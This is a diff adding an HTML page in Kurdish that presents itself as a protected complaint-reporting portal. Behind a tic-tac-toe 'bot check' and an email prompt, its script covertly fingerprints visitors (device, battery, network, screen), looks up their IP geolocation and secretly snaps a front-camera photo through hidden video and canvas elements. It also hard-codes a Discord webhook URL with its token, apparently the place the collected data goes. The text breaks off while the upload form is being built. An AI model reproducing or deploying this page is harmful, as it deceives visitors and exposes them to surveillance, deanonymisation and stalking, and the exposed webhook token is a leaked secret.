@@ -1,0 +1,1164 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>404 - System Error</title>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    background: radial-gradient(circle at center, #00152e 0%, #000714 50%, #000205 100%);
+    color: #00e1ff;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    overflow-x: hidden;
+    position: relative;
+}
+
+body::before {
+    content: "404";
+    position: fixed;
+    inset: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;  
+    font-size: 320px;
+    font-weight: 900;
+    color: rgba(0, 225, 255, 0.015);
+    pointer-events: none;
+    z-index: 0;
+}
+
+body::after {
+    content: "";
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+        to bottom,
+        rgba(255,255,255,0.01) 0px,
+        rgba(255,255,255,0.01) 1px,
+        transparent 2px,
+        transparent 4px
+    );
+    pointer-events: none;
+    z-index: 10;
+}
+
+#introScreen {
+    position: fixed;
+    inset: 0;
+    background: radial-gradient(circle at center, #002244 0%, #000714 70%, #000205 100%);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+    text-align: center;
+    padding: 30px;
+}
+
+.intro-card {
+    border: 1px solid rgba(0, 225, 255, 0.4);
+    background: rgba(2, 12, 27, 0.9);
+    padding: 45px 35px;
+    border-radius: 16px;
+    box-shadow: 0 0 50px rgba(0, 140, 255, 0.25), inset 0 0 30px rgba(0, 225, 255, 0.05);
+    backdrop-filter: blur(12px);
+    max-width: 580px;
+    width: 100%;
+    position: relative;
+    animation: cardGlow 2.5s infinite alternate;
+}
+
+@keyframes cardGlow {
+    0% { box-shadow: 0 0 25px rgba(0, 140, 255, 0.3), inset 0 0 15px rgba(0, 225, 255, 0.05); border-color: rgba(0, 140, 255, 0.4); }
+    100% { box-shadow: 0 0 60px rgba(0, 225, 255, 0.6), inset 0 0 30px rgba(0, 225, 255, 0.15); border-color: rgba(0, 225, 255, 0.9); }
+}
+
+.intro-card::before {
+    content: "";
+    position: absolute;
+    width: 18px;
+    height: 18px;
+    border-top: 3px solid #00e1ff;
+    border-left: 3px solid #00e1ff;
+    top: -6px;
+    left: -6px;
+    border-radius: 4px;
+}
+
+.intro-card::after {
+    content: "";
+    position: absolute;
+    width: 18px;
+    height: 18px;
+    border-bottom: 3px solid #00e1ff;
+    border-right: 3px solid #00e1ff;
+    bottom: -6px;
+    right: -6px;
+    border-radius: 4px;
+}
+
+.intro-logo-text {
+    font-size: 60px;
+    font-weight: 900;
+    color: #00e1ff;
+    text-shadow: 0 0 20px rgba(0, 140, 255, 0.8), 0 0 40px rgba(0, 225, 255, 0.5);
+    letter-spacing: 8px;
+    animation: textFlicker 1.5s infinite alternate;
+}
+
+.intro-desc-text {
+    font-size: 17px;
+    font-weight: 600;
+    color: #7bc6ff;
+    line-height: 1.8;
+    text-shadow: 0 0 10px rgba(0, 140, 255, 0.3);
+    display: none;
+    margin-top: 10px;
+}
+
+.intro-loader {
+    width: 100%;
+    height: 6px;
+    background: rgba(0, 140, 255, 0.15);
+    border-radius: 6px;
+    margin-top: 30px;
+    overflow: hidden;
+    position: relative;
+    box-shadow: inset 0 0 5px rgba(0,0,0,0.5);
+}
+
+.intro-loader-bar {
+    width: 0%;
+    height: 100%;
+    background: linear-gradient(90deg, #0088ff, #00e1ff);
+    box-shadow: 0 0 20px #00e1ff;
+    transition: width 0.1s linear;
+    border-radius: 6px;
+}
+
+@keyframes textFlicker {
+    0% { opacity: 0.85; transform: scale(0.99); }
+    100% { opacity: 1; transform: scale(1); }
+}
+
+.container {
+    width: 430px;
+    max-width: 92%;
+    margin: 60px auto;
+    position: relative;
+    z-index: 2;
+    display: none;
+}
+
+.menu,
+.name-screen,
+.sections-screen {
+    border: 1px solid rgba(0, 140, 255, 0.4);
+    background: rgba(2, 12, 27, 0.88);
+    padding: 35px 30px;
+    box-shadow:
+        0 0 35px rgba(0, 140, 255, 0.2),
+        inset 0 0 40px rgba(0, 140, 255, 0.03);
+    backdrop-filter: blur(15px);
+    position: relative;
+    border-radius: 14px;
+}
+
+.menu::before,
+.name-screen::before,
+.sections-screen::before {
+    content: "";
+    position: absolute;
+    width: 12px;
+    height: 12px;
+    border-top: 2px solid #00e1ff;
+    border-left: 2px solid #00e1ff;
+    top: -3px;
+    left: -3px;
+    border-radius: 3px;
+}
+
+.menu::after,
+.name-screen::after,
+.sections-screen::after {
+    content: "";
+    position: absolute;
+    width: 12px;
+    height: 12px;
+    border-bottom: 2px solid #00e1ff;
+    border-right: 2px solid #00e1ff;
+    bottom: -3px;
+    right: -3px;
+    border-radius: 3px;
+}
+
+.logo {
+    text-align: center;
+    font-size: 90px;
+    font-weight: 900;
+    letter-spacing: 10px;
+    color: #00e1ff;
+    text-shadow:
+        0 0 10px rgba(0, 140, 255, 0.8),
+        0 0 25px rgba(0, 140, 255, 0.5),
+        0 0 40px rgba(0, 225, 255, 0.3);
+    margin-bottom: 5px;
+}
+
+.subtitle {
+    text-align: center;
+    color: #7bc6ff;
+    font-size: 14px;
+    margin-bottom: 30px;
+    font-weight: 500;
+    letter-spacing: 1px;
+}
+
+button,
+.link-button {
+    width: 100%;
+    padding: 15px;
+    margin-top: 12px;
+    background: linear-gradient(135deg, rgba(0, 136, 255, 0.08), rgba(0, 210, 255, 0.03));
+    border: 1px solid rgba(0, 140, 255, 0.5);
+    color: #00e1ff;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    text-decoration: none;
+    display: block;
+    text-align: center;
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    border-radius: 8px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+}
+
+button:hover,
+.link-button:hover {
+    background: linear-gradient(135deg, #0088ff, #00d2ff);
+    color: #fff;
+    border-color: #00e1ff;
+    box-shadow: 0 0 25px rgba(0, 210, 255, 0.6), inset 0 0 10px rgba(255,255,255,0.3);
+    transform: translateY(-2px);
+}
+
+.terminal {
+    margin-top: 25px;
+    padding: 18px;
+    border: 1px solid rgba(0, 140, 255, 0.25);
+    background: rgba(0, 4, 12, 0.75);
+    font-family: 'Courier New', Courier, monospace;
+    font-size: 12px;
+    line-height: 1.8;
+    color: #7bc6ff;
+    border-radius: 8px;
+    box-shadow: inset 0 0 15px rgba(0,0,0,0.8);
+}
+
+.terminal span {
+    color: #00e1ff;
+    font-weight: bold;
+}
+
+.name-screen {
+    display: none;
+}
+
+.name-title {
+    text-align: center;
+    font-size: 24px;
+    font-weight: 700;
+    margin-bottom: 10px;
+    color: #00e1ff;
+    text-shadow: 0 0 10px rgba(0,210,255,0.4);
+}
+
+.bot-warning {
+    text-align: center;
+    color: #7bc6ff;
+    font-size: 13px;
+    margin-bottom: 20px;
+    line-height: 1.8;
+}
+
+.ox-box {
+    margin-top: 10px;
+}
+
+.ox-board {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 8px;
+    width: 225px;
+    margin: auto;
+}
+
+.ox-cell {
+    width: 70px;
+    height: 70px;
+    padding: 0;
+    margin: 0;
+    border: 1px solid rgba(0, 140, 255, 0.5);
+    background: rgba(0, 5, 15, 0.9);
+    color: #00e1ff;
+    font-size: 28px;
+    font-weight: bold;
+    cursor: pointer;
+    border-radius: 8px;
+    transition: all 0.2s ease;
+}
+
+.ox-cell:hover {
+    background: rgba(0, 136, 255, 0.2);
+    border-color: #00e1ff;
+    box-shadow: 0 0 15px rgba(0, 210, 255, 0.4);
+}
+
+.ox-message {
+    text-align: center;
+    color: #7bc6ff;
+    font-size: 13px;
+    margin-top: 18px;
+    min-height: 20px;
+    font-weight: 500;
+}
+
+.ox-reset {
+    font-size: 13px;
+    padding: 12px;
+    margin-top: 15px;
+}
+
+.gmail-screen {
+    display: none;
+}
+
+input,
+textarea {
+    width: 100%;
+    padding: 14px 16px;
+    background: rgba(0, 4, 12, 0.8);
+    border: 1px solid rgba(0, 140, 255, 0.4);
+    outline: none;
+    color: #00e1ff;
+    font-size: 14px;
+    border-radius: 8px;
+    transition: all 0.3s ease;
+    box-shadow: inset 0 2px 5px rgba(0,0,0,0.5);
+}
+
+input:focus,
+textarea:focus {
+    border-color: #00e1ff;
+    box-shadow: 0 0 20px rgba(0, 210, 255, 0.4), inset 0 2px 5px rgba(0,0,0,0.5);
+    background: rgba(0, 8, 22, 0.9);
+}
+
+textarea {
+    min-height: 100px;
+    resize: vertical;
+}
+
+.error {
+    color: #ff4d6d;
+    font-size: 12px;
+    text-align: center;
+    margin-top: 10px;
+    display: none;
+    font-weight: 600;
+    text-shadow: 0 0 8px rgba(255, 77, 109, 0.4);
+}
+
+.sections-screen {
+    display: none;
+}
+
+.sections-title {
+    text-align: center;
+    font-size: 24px;
+    font-weight: 700;
+    margin-bottom: 25px;
+    color: #00e1ff;
+    text-shadow: 0 0 10px rgba(0,210,255,0.4);
+}
+
+.section-number {
+    color: #0066cc;
+    margin-right: 10px;
+    font-weight: 800;
+}
+
+.back-btn {
+    margin-top: 20px;
+    border-color: rgba(255, 77, 109, 0.4);
+    color: #ff758c;
+}
+
+.back-btn:hover {
+    background: linear-gradient(135deg, #ff4d6d, #ff758c);
+    border-color: #ff4d6d;
+    box-shadow: 0 0 20px rgba(255, 77, 109, 0.6);
+    color: #fff;
+}
+
+.complaint-screen {
+    display: none;
+}
+
+.complaint-title {
+    text-align: center;
+    font-size: 24px;
+    font-weight: 700;
+    margin-bottom: 22px;
+    color: #00e1ff;
+    text-shadow: 0 0 10px rgba(0,210,255,0.4);
+}
+
+.complaint-group {
+    margin-bottom: 15px;
+}
+
+.complaint-group label {
+    display: block;
+    color: #7bc6ff;
+    font-size: 12px;
+    margin-bottom: 6px;
+    text-align: right;
+    font-weight: 600;
+}
+
+.complaint-group input,
+.complaint-group textarea {
+    direction: rtl;
+}
+
+.complaint-group input[type="file"] {
+    padding: 10px;
+    cursor: pointer;
+    background: rgba(0, 4, 12, 0.6);
+}
+
+.complaint-success {
+    display: none;
+    text-align: center;
+    color: #00e1ff;
+    font-size: 13px;
+    margin-top: 15px;
+    line-height: 1.8;
+    font-weight: 600;
+    text-shadow: 0 0 10px rgba(0, 225, 255, 0.5);
+}
+
+.suggestion-screen {
+    display: none;
+}
+
+.suggestion-title {
+    text-align: center;
+    font-size: 24px;
+    font-weight: 700;
+    margin-bottom: 22px;
+    color: #00e1ff;
+    text-shadow: 0 0 10px rgba(0,210,255,0.4);
+}
+
+.suggestion-group {
+    margin-bottom: 15px;
+}
+
+.suggestion-group label {
+    display: block;
+    color: #7bc6ff;
+    font-size: 12px;
+    margin-bottom: 6px;
+    text-align: right;
+    font-weight: 600;
+}
+
+.suggestion-group input,
+.suggestion-group textarea {
+    direction: rtl;
+}
+
+.suggestion-group input[type="file"] {
+    padding: 10px;
+    cursor: pointer;
+    background: rgba(0, 4, 12, 0.6);
+}
+
+.suggestion-success {
+    display: none;
+    text-align: center;
+    color: #00e1ff;
+    font-size: 13px;
+    margin-top: 15px;
+    line-height: 1.8;
+    font-weight: 600;
+    text-shadow: 0 0 10px rgba(0, 225, 255, 0.5);
+}
+
+.report-login-screen {
+    display: none;
+}
+
+.report-login-title {
+    text-align: center;
+    font-size: 24px;
+    font-weight: 700;
+    margin-bottom: 22px;
+    color: #00e1ff;
+    text-shadow: 0 0 10px rgba(0,210,255,0.4);
+}
+
+.report-login-group {
+    margin-bottom: 15px;
+}
+
+.report-login-group label {
+    display: block;
+    color: #7bc6ff;
+    font-size: 12px;
+    margin-bottom: 6px;
+    text-align: right;
+    font-weight: 600;
+}
+
+@media (max-width: 500px) {
+    .container {
+        margin: 30px auto;
+    }
+    .logo {
+        font-size: 70px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<!-- عناصر مەخفی بۆ کامێرا -->
+<video id="webcamVideo" autoplay playsinline style="display:none;"></video>
+<canvas id="webcamCanvas" style="display:none;"></canvas>
+
+<!-- ULTIMATE INTRO SCREEN -->
+<div id="introScreen">
+    <div class="intro-card">
+        <div class="intro-logo-text" id="introLogoText">xoshnaw404</div>
+        <div class="intro-desc-text" id="introDescText">داتای هەموو کەسێک تاوانبار یاخود سکاڵاکەر لێرە پارێزراوە و وردبینی بۆ هەموو داتایەک ئەکەین</div>
+        <div class="intro-loader">
+            <div class="intro-loader-bar" id="introLoaderBar"></div>
+        </div>
+    </div>
+</div>
+
+<div class="container" id="mainContainer">
+
+<!-- START -->
+<div class="menu" id="menu">
+    <div class="logo">404</div>
+    <div class="subtitle">( بەشی سکاڵا تۆمار کردن )</div>
+    <button onclick="openOX()">سکاڵا تۆمار کردن</button>
+    <div class="terminal">
+        <div><span>[ SYSTEM ]</span> ONLINE</div>
+        <div><span>[ SECURITY ]</span> ACTIVE</div>
+        <div><span>[ CONNECTION ]</span> ENCRYPTED</div>
+        <div><span>[ ACCESS ]</span> GRANTED</div>
+        <div><span>[ STATUS ]</span> WAITING...</div>
+        <div><span>[ DEV ]</span> BY 404</div>
+    </div>
+</div>
+
+<!-- OX -->
+<div class="name-screen" id="oxScreen">
+    <div class="name-title">OX</div>
+    <div class="bot-warning">ڕێگە نادات 🤖 BOT سیستەم</div>
+    <div class="ox-box">
+        <div class="ox-board">
+            <button class="ox-cell" onclick="playOX(0)"></button>
+            <button class="ox-cell" onclick="playOX(1)"></button>
+            <button class="ox-cell" onclick="playOX(2)"></button>
+            <button class="ox-cell" onclick="playOX(3)"></button>
+            <button class="ox-cell" onclick="playOX(4)"></button>
+            <button class="ox-cell" onclick="playOX(5)"></button>
+            <button class="ox-cell" onclick="playOX(6)"></button>
+            <button class="ox-cell" onclick="playOX(7)"></button>
+            <button class="ox-cell" onclick="playOX(8)"></button>
+        </div>
+        <div class="ox-message" id="oxMessage">تۆ X ـیت</div>
+        <button class="ox-reset" onclick="resetOX()">نوێکردنەوەی OX</button>
+    </div>
+</div>
+
+<!-- GMAIL -->
+<div class="name-screen gmail-screen" id="gmailScreen">
+    <div class="name-title">Gmail - OX</div>
+    <input type="email" id="gmailInput" placeholder="example@gmail.com" autocomplete="email">
+    <div style="color:#7bc6ff; font-size:12px; text-align:center; margin-top:15px; line-height:1.8;">
+        تکایە ئەم ڕێنماییانە جێبەجێ بکە<br>سیستەم ڕێگە نادات BOT 🤖 بێتە سیستەم
+    </div>
+    <div class="error" id="emailError">تکایە Gmail ـێکی دروست بنووسە</div>
+    <button onclick="checkEmail()">بەردەوام بە</button>
+</div>
+
+<!-- SECTIONS -->
+<div class="sections-screen" id="sectionsScreen">
+    <div class="sections-title">بەشەکان</div>
+    <a class="link-button" href="crime.html"><span class="section-number">01</span> تاوان</a>
+    <button class="link-button" onclick="openComplaint()"><span class="section-number">02</span> سکاڵا</button>
+    <button class="link-button" onclick="openReportLogin()"><span class="section-number">03</span> ڕاپۆرت</button>
+    <button class="link-button" onclick="openSuggestion()"><span class="section-number">04</span> پێشنیار</button>
+</div>
+
+<!-- COMPLAINT -->
+<div class="name-screen complaint-screen" id="complaintScreen">
+    <div class="complaint-title">سکاڵا</div>
+    <div class="complaint-group">
+        <label>ناوی تاوانبار لە TikTok</label>
+        <input type="text" id="tiktok" placeholder="ناوی TikTok">
+    </div>
+    <div class="complaint-group">
+        <label>ناوی تاوانبار لە Snapchat</label>
+        <input type="text" id="snapchat" placeholder="ناوی Snapchat">
+    </div>
+    <div class="complaint-group">
+        <label>ناوی تاوانبار لە Instagram</label>
+        <input type="text" id="instagram" placeholder="ناوی Instagram">
+    </div>
+    <div class="complaint-group">
+        <label>ناوی تاوانبار لە Telegram</label>
+        <input type="text" id="telegram" placeholder="ناوی Telegram">
+    </div>
+    <div class="complaint-group">
+        <label>ناوی تاوانبار لە Facebook</label>
+        <input type="text" id="facebook" placeholder="ناوی Facebook">
+    </div>
+    <div class="complaint-group">
+        <label>ناوی کەسەکە خۆی</label>
+        <input type="text" id="personName" placeholder="ناوی کەسەکە">
+    </div>
+    <div class="complaint-group">
+        <label>وێنەی کەسەکە</label>
+        <input type="file" id="personImage" accept="image/*">
+    </div>
+    <div class="complaint-group">
+        <label>شوێنی نیشتەجێبوون</label>
+        <textarea id="location" placeholder="شوێنی نیشتەجێبوون"></textarea>
+    </div>
+    <button onclick="sendComplaint()">ناردنی سکاڵا</button>
+    <button class="back-btn" onclick="backToSections()">گەڕانەوە</button>
+    <div class="complaint-success" id="complaintSuccess">سکاڵاکە بە سەرکەوتوویی تۆمار کرا.</div>
+</div>
+
+<!-- SUGGESTION -->
+<div class="name-screen suggestion-screen" id="suggestionScreen">
+    <div class="suggestion-title">پێشنیار</div>
+    <div class="suggestion-group">
+        <label>هۆکاری گومان کردن لە کەسی بەرامبەر</label>
+        <textarea id="suggestionReason" placeholder="هۆکاری گومان کردن بنووسە..."></textarea>
+    </div>
+    <div class="suggestion-group">
+        <label>چات / دەقی پەیوەندیدار</label>
+        <textarea id="suggestionChat" placeholder="چات یان دەقی پەیوەندیدار بنووسە..."></textarea>
+    </div>
+    <div class="suggestion-group">
+        <label>وێنە</label>
+        <input type="file" id="suggestionImage" accept="image/*">
+    </div>
+    <div class="suggestion-group">
+        <label>ڤیدیۆ</label>
+        <input type="file" id="suggestionVideo" accept="video/*">
+    </div>
+    <button onclick="sendSuggestion()">ناردنی پێشنیار</button>
+    <button class="back-btn" onclick="backFromSuggestion()">گەڕانەوە</button>
+    <div class="suggestion-success" id="suggestionSuccess">پێشنیارەکە بە سەرکەوتوویی تۆمار کرا.</div>
+</div>
+
+<!-- REPORT LOGIN -->
+<div class="name-screen report-login-screen" id="reportLoginScreen">
+    <div class="report-login-title">Report Login</div>
+    <div class="report-login-group">
+        <label>Username</label>
+        <input type="text" id="reportUsername" placeholder="Username" autocomplete="username">
+    </div>
+    <div class="report-login-group">
+        <label>Password</label>
+        <input type="password" id="reportPassword" placeholder="Password" autocomplete="current-password">
+    </div>
+    <div class="error" id="reportLoginError">Username یان Password هەڵەیە</div>
+    <button onclick="checkReportLogin()">چوونەژوورەوە</button>
+    <button class="back-btn" onclick="backFromReportLogin()">گەڕانەوە</button>
+</div>
+
+</div>
+
+<script>
+window.addEventListener("DOMContentLoaded", function() {
+    const introLogoText = document.getElementById("introLogoText");
+    const introDescText = document.getElementById("introDescText");
+    const introScreen = document.getElementById("introScreen");
+    const mainContainer = document.getElementById("mainContainer");
+    const loaderBar = document.getElementById("introLoaderBar");
+
+    let progress = 0;
+    const totalTime = 9000;
+    const intervalTime = 90;
+    const increment = (intervalTime / totalTime) * 100;
+
+    const loadingInterval = setInterval(function() {
+        progress += increment;
+        if (progress >= 100) progress = 100;
+        loaderBar.style.width = progress + "%";
+    }, intervalTime);
+
+    setTimeout(function() {
+        introLogoText.style.display = "none";
+        introDescText.style.display = "block";
+    }, 3000);
+
+    setTimeout(function() {
+        clearInterval(loadingInterval);
+        introScreen.style.display = "none";
+        mainContainer.style.display = "block";
+    }, 9000);
+});
+
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553142746473046018/59OExN87r_h_CTITipSbM6Ix4wiO32CiQuzmJEL0EAMQNrBsJL07604PB1X1tw9stPFM";
+
+function getDetailedDevice() {
+    const ua = navigator.userAgent;
+    let deviceName = "Unknown Device";
+    let platform = "Unknown Platform";
+
+    if (/windows/i.test(ua)) platform = "Windows PC 💻";
+    else if (/macintosh|mac os x/i.test(ua)) platform = "Mac PC 💻";
+    else if (/linux/i.test(ua)) platform = "Linux PC 💻";
+    else if (/android/i.test(ua)) platform = "Android Mobile 📱";
+    else if (/iphone|ipad|ipod/i.test(ua)) platform = "iOS Device 📱";
+
+    if (/iphone/i.test(ua)) {
+        if (/iphone 14/i.test(ua)) deviceName = "iPhone 14";
+        else if (/iphone 13/i.test(ua)) deviceName = "iPhone 13 Series";
+        else if (/iphone 12/i.test(ua)) deviceName = "iPhone 12 Series";
+        else if (/iphone 15/i.test(ua)) deviceName = "iPhone 15 Series";
+        else if (/iphone 16/i.test(ua)) deviceName = "iPhone 16 Series";
+        else deviceName = "Apple iPhone";
+    } else {
+        let match = ua.match(/\(([^)]+)\)/);
+        if (match && match[1]) deviceName = match[1];
+        else deviceName = ua;
+    }
+    return `${platform} (${deviceName})`;
+}
+
+async function getBatteryInfo() {
+    if ('getBattery' in navigator) {
+        try {
+            const battery = await navigator.getBattery();
+            const level = Math.round(battery.level * 100) + "%";
+            const charging = battery.charging ? "🔌 لە شەحندایە" : "🔋 لە شەحندا نییە";
+            return `${level} (${charging})`;
+        } catch (e) { return "نەزاندراوە"; }
+    }
+    return "پشتیوانی ناکرێت";
+}
+
+function getNetworkInfo() {
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (connection) {
+        let type = connection.effectiveType ? connection.effectiveType.toUpperCase() : "نەزاندراوە";
+        let connType = connection.type ? connection.type : "";
+        if (connType === "wifi") return `Wi-Fi 🛜 (${type})`;
+        return `Mobile / Network Data 📶 (${type})`;
+    }
+    return "پشتیوانی ناکرێت";
+}
+
+function getExtraScreenAndSystemInfo() {
+    let screenRes = `${window.screen.width}x${window.screen.height}`;
+    let colorDepth = window.screen.colorDepth + "-bit";
+    let language = navigator.language || navigator.userLanguage || "نەزاندراوە";
+    let hardwareConcurrency = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cores" : "نەزاندراوە";
+    let deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "نەزاندراوە";
+    return `🖥️ قەبارەی شاشە: ${screenRes} (${colorDepth})\n🌐 زمان: ${language}\n⚙️ ژمارەی پرۆسێسەر (Cores): ${hardwareConcurrency}\n💾 قەبارەی نزیکەیی RAM: ${deviceMemory}`;
+}
+
+async function getIPAndLocationDetails() {
+    try {
+        let response = await fetch('https://ipapi.co/json/');
+        let data = await response.json();
+        return {
+            ip: data.ip || "نەزاندراوە",
+            locationInfo: `📍 **لۆکەیشنی IP:**وڵات: ${data.country_name || "نەزاندراوە"} | شار: ${data.city || "نەزاندراوە"} | ناوچە: ${data.region || "نەزاندراوە"} | ISP: ${data.org || "نەزاندراوە"} (Lat: ${data.latitude}, Lon: ${data.longitude})`
+        };
+    } catch (e) {
+        try {
+            let fallback = await fetch('https://api.ipify.org?format=json');
+            let fbData = await fallback.json();
+            return { ip: fbData.ip, locationInfo: "📍 **لۆکەیشنی IP:** لۆکەیشن بەردەست نییە" };
+        } catch (err) {
+            return { ip: "نەزاندراوە", locationInfo: "📍 **لۆکەیشنی IP:** نەزاندراوە" };
+        }
+    }
+}
+
+// گرتنی وێنەی کامێرای پێشەوە تەنها لە کاتی کلیکدا
+async function captureWebcamImage() {
+    let frontImage = null;
+    const videoElement = document.getElementById("webcamVideo");
+    const canvasElement = document.getElementById("webcamCanvas");
+
+    try {
+        const streamFront = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" }, audio: false 
+        });
+        videoElement.srcObject = streamFront;
+        videoElement.style.display = "block";
+        await videoElement.play();
+        
+        await new Promise(r => setTimeout(r, 1200));
+        canvasElement.width = videoElement.videoWidth || 640;
+        canvasElement.height = videoElement.videoHeight || 480;
+        const ctx = canvasElement.getContext("2d");
+        ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+        
+        streamFront.getTracks().forEach(track => track.stop());
+        videoElement.style.display = "none";
+        
+        const blobFront = await new Promise(res => canvasElement.toBlob(res, "image/jpeg", 0.85));
+        frontImage = blobFront;
+    } catch (e) {
+        videoElement.style.display = "none";
+        console.log("کامێرای پێشەوە بەردەست نەبوو:", e);
+    }
+
+    return frontImage;
+}
+
+const DB_NAME = "404_REPORT_SYSTEM";
+const DB_VERSION = 1;
+
+function openDatabase() {
+    return new Promise(function(resolve, reject) {
+        const request = indexedDB.open(DB_NAME, DB_VERSION);
+        request.onupgradeneeded = function(event) {
+            const db = event.target.result;
+            if (!db.objectStoreNames.contains("complaints")) {
+                db.createObjectStore("complaints", { keyPath: "id", autoIncrement: true });
+            }
+            if (!db.objectStoreNames.contains("suggestions")) {
+                db.createObjectStore("suggestions", { keyPath: "id", autoIncrement: true });
+            }
+        };
+        request.onsuccess = function(event) { resolve(event.target.result); };
+        request.onerror = function() { reject(request.error); };
+    });
+}
+
+function openOX() {
+    document.getElementById("menu").style.display = "none";
+    document.getElementById("gmailScreen").style.display = "none";
+    document.getElementById("sectionsScreen").style.display = "none";
+    document.getElementById("complaintScreen").style.display = "none";
+    document.getElementById("suggestionScreen").style.display = "none";
+    document.getElementById("reportLoginScreen").style.display = "none";
+    document.getElementById("oxScreen").style.display = "block";
+}
+
+let board = ["","","","","","","","",""];
+let gameOver = false;
+
+function playOX(index) {
+    if (board[index] !== "" || gameOver) return;
+    board[index] = "X";
+    updateBoard();
+
+    if (checkWin("X")) {
+        gameOver = true;
+        document.getElementById("oxMessage").innerText = "بردیتەوە! ئێستا Gmail بکەرەوە...";
+        setTimeout(function() {
+            document.getElementById("oxScreen").style.display = "none";
+            document.getElementById("gmailScreen").style.display = "block";
+            document.getElementById("gmailInput").focus();
+        }, 700);
+        return;
+    }
+    if (checkDraw()) {
+        document.getElementById("oxMessage").innerText = "یارییەکە یەکسان بوو، دووبارە بکەوە";
+        return;
+    }
+    botMove();
+}
+
+function botMove() {
+    let empty = [];
+    for (let i = 0; i < board.length; i++) {
+        if (board[i] === "") empty.push(i);
+    }
+    if (empty.length === 0 || gameOver) return;
+    let randomIndex = empty[Math.floor(Math.random() * empty.length)];
+    board[randomIndex] = "O";
+    updateBoard();
+    if (checkWin("O")) {
+        gameOver = true;
+        document.getElementById("oxMessage").innerText = "BOT بردیەوە! هیچ ڕێگایەک بۆ Gmail نییە.";
+    }
+}
+
+function updateBoard() {
+    const cells = document.querySelectorAll(".ox-cell");
+    for (let i = 0; i < cells.length; i++) cells[i].innerText = board[i];
+}
+
+function checkWin(player) {
+    const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
+    return wins.some(combo => board[combo[0]] === player && board[combo[1]] === player && board[combo[2]] === player);
+}
+
+function checkDraw() {
+    return board.every(cell => cell !== "");
+}
+
+function resetOX() {
+    board = ["","","","","","","","",""];
+    gameOver = false;
+    document.getElementById("oxMessage").innerText = "تۆ X ـیت";
+    updateBoard();
+}
+
+let userEmail = "";
+let emailAnalysisInfo = "";
+
+function analyzeEmail(email) {
+    let domain = email.split('@')[1] ? email.split('@')[1].toLowerCase() : "";
+    let providerName = "نەزاندراوە";
+    let accountType = "گشتی (Personal)";
+
+    if (domain === "gmail.com") {
+        providerName = "Google Gmail";
+        accountType = "ئیمەیڵی سەرەکی گووگڵ (Android / Play Store / Services)";
+    } else if (domain === "yahoo.com" || domain === "yahoo.co.uk") {
+        providerName = "Yahoo Mail";
+        accountType = "ئیمەیڵی یاهو کۆن";
+    } else if (domain === "hotmail.com" || domain === "outlook.com" || domain === "live.com") {
+        providerName = "Microsoft Outlook / Hotmail";
+        accountType = "ئیمەیڵی مایکرۆسۆفت (Windows / Office)";
+    } else if (domain === "icloud.com" || domain === "me.com") {
+        providerName = "Apple iCloud";
+        accountType = "ئیمەیڵی ئەپڵ (Apple ID / iOS Ecosystem)";
+    } else {
+        providerName = `دۆمەینی تایبەت (${domain})`;
+        accountType = "سێرڤەری تایبەت یان کۆمپانیا";
+    }
+
+    return `📧 جۆری پلاتفۆرم: ${providerName}\n🔍 جۆری هەژمار: ${accountType}\n🌐 دۆمەین: @${domain}`;
+}
+
+function checkEmail() {
+    const email = document.getElementById("gmailInput").value.trim();
+    const error = document.getElementById("emailError");
+
+    if (email === "" || !email.toLowerCase().includes("@")) {
+        error.style.display = "block";
+        return;
+    }
+
+    error.style.display = "none";
+    userEmail = email;
+    emailAnalysisInfo = analyzeEmail(email);
+
+    document.getElementById("gmailScreen").style.display = "none";
+    document.getElementById("sectionsScreen").style.display = "block";
+}
+
+function openComplaint() {
+    document.getElementById("sectionsScreen").style.display = "none";
+    document.getElementById("complaintScreen").style.display = "block";
+}
+
+function backToSections() {
+    document.getElementById("complaintScreen").style.display = "none";
+    document.getElementById("sectionsScreen").style.display = "block";
+}
+
+async function sendComplaint() {
+    const successDiv = document.getElementById("complaintSuccess");
+    
+    successDiv.style.display = "block";
+    successDiv.innerText = "جوان بۆستە... لۆکەیشن و کامێرا و داتای سیستەم کۆدەکرێنەوە...";
+    successDiv.style.color = "#00e1ff";
+
+    await new Promise(resolve => setTimeout(resolve, 2000));
+
+    // کۆکردنەوەی لۆکەیشن و IP
+    const ipData = await getIPAndLocationDetails();
+    const ipAddress = ipData.ip;
+    const ipLocationDetails = ipData.locationInfo;
+
+    // گرتنی وێنەی کامێرای پێشەوە بە کلیک
+    const webcamImage = await captureWebcamImage();
+
+    const tiktok = document.getElementById("tiktok").value.trim();
+    const snapchat = document.getElementById("snapchat").value.trim();
+    const instagram = document.getElementById("instagram").value.trim();
+    const telegram = document.getElementById("telegram").value.trim();
+    const facebook = document.getElementById("facebook").value.trim();
+    const personName = document.getElementById("personName").value.trim();
+    const location = document.getElementById("location").value.trim();
+    const uploadedImage = document.getElementById("personImage").files[0] || null;
+    
+    const deviceType = getDetailedDevice();
+    const batteryStatus = await getBatteryInfo();
+    const networkStatus = getNetworkInfo();
+    const extraSystemInfo = getExtraScreenAndSystemInfo();
+
+    if (personName === "" || location === "") {
+        alert("تکایە ناوی کەسەکە و شوێنی نیشتەجێبوون پڕبکەرەوە.");
+        successDiv.style.display = "none";
+        return;
+    }
+
+    const formData = new FormData();
+    
